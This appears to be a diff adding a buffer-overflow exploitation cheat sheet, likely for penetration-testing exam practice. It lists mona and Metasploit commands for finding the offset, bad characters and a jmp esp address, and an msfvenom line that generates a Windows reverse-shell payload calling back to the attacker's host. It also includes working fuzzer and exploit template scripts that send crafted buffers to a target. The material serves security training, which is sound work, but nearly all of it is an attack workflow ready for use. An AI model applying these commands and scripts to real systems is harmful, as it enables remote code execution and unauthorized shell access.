@@ -1,0 +1,83 @@
+nc $ip $port
+
+!mona config -set workingfolder c:\mona\%p
+
+python3 fuzzer.py
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+
+python3 exploit.py
+
+!mona findmsp -distance 600 // change 600 value with founded value
+retn="BBBB" // response will be 42424242
+
+!mona bytearray -b "\x00"
+python3 bahchar.py
+
+python3 exploit.py 
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address> // address = esp
+!mona jmp -r esp -cpb "\x00" // change "\x00" with founded badchars
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+padding = "\x90" * 16
+
+          ***FUZZER.PY***
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "MACHINE_IP"
+
+port = $port
+timeout = 5
+prefix = ""
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+  
+  
+            ***EXPLOIT.PY***
+import socket
+
+ip = "MACHINE_IP"
+port = $port
+
+prefix = ""
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+              
+              ***BADCHARS.PY***
+for x in range(1, 256):
+  print("\\x" + "{:02x}".format(x), end='')
+print()
+
